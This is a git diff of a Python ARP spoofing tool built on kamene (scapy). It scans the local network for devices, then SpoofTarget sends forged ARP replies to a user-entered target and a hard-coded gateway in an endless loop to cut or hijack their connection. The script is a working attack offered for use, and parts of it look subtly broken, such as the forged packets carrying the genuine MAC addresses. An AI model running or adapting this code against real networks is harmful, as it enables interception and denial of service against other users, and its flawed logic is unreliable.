@@ -1,5 +1,5 @@
-from http import client
-from typing import Dict
+import re
+from traceback import print_tb
 import kamene.all as scapy
 import time
 import os
@@ -14,30 +14,60 @@ class ArpManager:
         self.localIp = self.GetLocalIp()
         self.verbose = verbose
         self.arpTable = {}
-        self.arpTableLock = threading.Lock()
-        self.arpTable['00:00:00:00:00:00'] = ''
         if self.verbose:
             #show local ip 
             print("Local IP: " + self.localIp)
+            print("Initializing ARP table...")
+        for x in range(1, 4):
+            self.arpTable.update(self._GetNetworkDevices(1))
+            if self.verbose:
+                print(f"{x}/3")
+        if self.verbose:
+            print("ARP table initialized")
+            print(self.arpTable)
 
+        #initialize the thread to update the arp table
+        self.updateArpTableThread = threading.Thread(target=self.updateArpTable)
     def GetLocalIp(self):
         return socket.gethostbyname(socket.gethostname())
 
     def GetMac(self, ip):
-        pass
+        #list ip table dictioanry
+        for key, value in self.arpTable.items():
+            print(f"{key} - {ip}")
+            if key == ip:
+                return value
 
+        raise ValueError("IP not found in the arp table")
     def SpoofTarget(self, ip, gateway):
+        """
+        Spoof the target's arp table to make it think that you are the gateway
+        """
+        #get the mac address of the target
+        targetMac = self.GetMac(ip)
+        #get the mac address of the gateway
+        gatewayMac = self.GetMac(gateway)
+        while True:
+            #cut the connection between the target and the gateway
+            scapy.send(scapy.ARP(op=2, pdst=ip, hwdst=targetMac, psrc=gateway, hwsrc=gatewayMac), verbose=0)
+            #cut the connection between the gateway and the target
+            scapy.send(scapy.ARP(op=2, pdst=gateway, hwdst=gatewayMac, psrc=ip, hwsrc=targetMac), verbose=0)
+            time.sleep(2)
+            
+            
+    def updateArpTable(self):
+        """
+        Update the arp table
+        """
+        while True:
+            self.arpTable.update(self._GetNetworkDevices(1))
+            time.sleep(5)
 
-        #send arp packet to target to spoof it
-        arpPacket = scapy.ARP(op=2, pdst=ip, hwdst=self.GetMac(ip), psrc=gateway)
-        scapy.send(arpPacket, verbose=False)
-        
-
-    def GetNetworkDevices(self, deepLevel : int) -> Dict:
+    def _GetNetworkDevices(self, deepLevel : int):
         """
         Get all devices in the network
         deepLevel: define the mask of the network
-                     mask      ip range
+                   mask               ip range
             1 : 255.255.255.0 -> 256    
             2 : 255.255.0.0   -> 65,536   
             3 : 255.0.0.0     -> 16,777,216 
@@ -75,4 +105,9 @@ class ArpManager:
         return clients
 
 manager = ArpManager(verbose=True)
-print(manager.GetNetworkDevices(2))
+#show ip and ask for an ip to spoof and get the mac address of the selected ip
+print(manager.arpTable)
+ip = input("Enter an ip to spoof: ")
+print(manager.GetMac(ip))
+manager.SpoofTarget(ip, "192.168.161.136")
+
